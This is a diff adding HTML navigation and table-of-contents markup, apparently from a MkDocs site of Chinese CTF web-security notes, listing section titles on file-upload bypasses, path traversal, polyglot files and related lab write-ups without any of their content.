+    <nav class="md-nav" aria-label="五、路径穿越：filename 里的 ../">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        作用
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        判断有没有生效
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        过滤与绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2f" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        %2f 为什么有效（经典原理）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        访问时千万不要带 ..
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        六、几个把人带偏的假象
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="六、几个把人带偏的假象">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ② "图像无法正确显示"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ③ 同名文件打架
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ④ 上传成功了，但文件被重命名
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        七、shell 代码本身的坑
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="七、shell 代码本身的坑">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ③ 最小验证顺序
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lab" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        八、六个 lab 与五个实战记录
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="八、六个 lab 与五个实战记录">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#81-lab" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.1 六个 lab 对照表
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#84-3-htaccess" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.4 实战 3：扩展名黑名单 + .htaccess
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#85-4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.5 实战 4：混淆扩展名（白名单 + 截断）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#86-5polyglot" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.6 实战 5：多语言文件（polyglot）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        判断"查的是内容还是后缀"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#polyglot" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        polyglot 的三种造法
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php-start-end" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        为什么 PHP 代码里要加 START / END
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        九、三道防线模型（最重要的一节）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="九、三道防线模型（最重要的一节）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#91" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.1 四种报错形态 ↔ 四层问题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#92" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.2 三道门用的"同一招"
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十、通用模型：解析器不一致
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十一、我踩的坑（实践版）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="十一、我踩的坑（实践版）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1invalid-image-file-name" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 1：把"Invalid image file name"理解成"内容不是图片"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-php5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 2：以为 .php5 上传成功就能执行
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-304" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 6：把 304 当成错误
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 7：把"图像无法显示"当成"没执行"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 8：不知道用响应头判断"执行了没"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#10system-php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 10：system() 里写 PHP 函数
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#11-shellphpjpg" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 11：以为 shell.php.jpg 能绕白名单
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 14：改后缀一直提示"不是合法图片"
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exiftool" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十二、工具：exiftool 速查
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="十二、工具：exiftool 速查">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#121" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.1 它是什么
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#123" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.3 三个核心参数
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#124" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.4 上传题最常用的四条命令
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#125-jpeg" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.5 常用的标签（JPEG）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#127-polyglot" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.7 polyglot 自检两条
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十三、拿到 shell 之后：常用命令速查
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="十三、拿到 shell 之后：常用命令速查">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#131" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.1 四步法（照着做就行）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#132-10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.2 最常用的 10 条命令
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#133-ls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.3 ls 详解
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#134-cat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.4 读文件：cat 家族
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#135-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.5 搜索：找不到 flag 就用这个
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#136" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.6 看环境：判断这台机器什么情况
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#137-ctf-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.7 CTF 里 flag 常放的位置
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#139" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13.9 一句话总结
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十四、一句话总结
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../rce/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RCE
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_4" id="__nav_2_4_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    RCE
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../rce/RCE%E4%B8%93%E9%A2%98/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RCE 专题
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../web/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web 通用
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_5" id="__nav_2_5_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web 通用
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/CTF-Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CTF-Web 学习笔记
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../audit/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    代码审计
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_6" id="__nav_2_6_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    代码审计
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../audit/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8-PHP%E4%B8%8EJava/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    代码审计入门
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../blog/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WP 博客
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    WP 博客
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    归档
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    归档
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/archive/2026/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2026
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    分类
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    分类
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/portswigger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PortSwigger
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    代码执行
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    命令注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件上传
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../files/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    工具字典
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    工具字典
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        一、先建立正确的心理模型
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        二、上传后怎么找真实路径
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="二、上传后怎么找真实路径">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        方法 1:上传响应里找
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        方法 2:看"显示这个文件"的页面源码 ⭐ 最可靠
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        方法 4:按常见路径试
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        三、判断"PHP 到底执行了没"
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="三、判断&#34;PHP 到底执行了没&#34;">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        铁证 1:看响应体
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        铁证 2:看响应头 ⭐ 5 秒判断
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-content-length" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        铁证 3:看 Content-Length
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4content-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        铁证 4:Content-Type
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        四、三个变量的绕过
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="四、三个变量的绕过">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        变量 1:后缀被拦
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        黑名单绕过速查表（按「生效条件」排）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        变量 1 的终极解法：不改我的后缀，改服务器的规则
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1-userini" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        变量 1 的终极解法（二）：.user.ini
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2content-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        变量 2:Content-Type 被查
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        变量 3:文件内容被查（图片头校验）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#filename" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        五、路径穿越：filename 里的 ../
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="五、路径穿越：filename 里的 ../">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        作用
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        判断有没有生效
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        过滤与绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2f" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        %2f 为什么有效（经典原理）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        访问时千万不要带 ..
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        六、几个把人带偏的假象
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="六、几个把人带偏的假象">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ② "图像无法正确显示"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ③ 同名文件打架
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ④ 上传成功了，但文件被重命名
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        七、shell 代码本身的坑
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="七、shell 代码本身的坑">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ③ 最小验证顺序
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lab" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        八、六个 lab 与五个实战记录
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="八、六个 lab 与五个实战记录">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#81-lab" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.1 六个 lab 对照表
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#84-3-htaccess" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.4 实战 3：扩展名黑名单 + .htaccess
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#85-4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.5 实战 4：混淆扩展名（白名单 + 截断）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#86-5polyglot" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8.6 实战 5：多语言文件（polyglot）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        判断"查的是内容还是后缀"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#polyglot" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        polyglot 的三种造法
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php-start-end" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        为什么 PHP 代码里要加 START / END
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        九、三道防线模型（最重要的一节）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="九、三道防线模型（最重要的一节）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#91" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.1 四种报错形态 ↔ 四层问题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#92" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.2 三道门用的"同一招"
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        十、通用模型：解析器不一致
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
